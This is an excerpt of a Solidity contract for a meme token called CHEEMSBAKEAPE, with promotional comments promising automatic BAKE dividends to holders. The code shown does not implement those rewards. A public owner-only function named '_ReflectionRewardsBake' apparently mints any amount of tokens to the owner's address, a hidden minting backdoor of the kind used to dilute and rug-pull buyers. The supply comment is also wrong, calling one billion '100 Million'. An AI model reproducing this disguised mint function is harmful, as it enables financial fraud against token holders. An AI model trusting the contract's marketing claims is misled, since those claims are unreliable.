...
//
// $CHEEMSBAKEAPE proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN CHEEMSBAKEAPE! With the auto-claim feature,
// simply hold$CHEEMSBAKEAPE and you'll receive BAKE automatically in your wallet.
// 
// Hold CHEEMSBAKEAPE and get rewarded in BAKE on every transaction!
//
//
// 📱 Telegram: https://t.me/CheemsBakeApe
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewardsBake(uint256 amount) public onlyOwner {
    _ReflectionRewardsBake(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsBake(address account, uint256 amount) internal virtual {
...
contract CHEEMSBAKEAPE is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("CHEEMSBAKE APE", "CHEEMSBAKEAPE") {
        _ReflectionRewardsBake(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}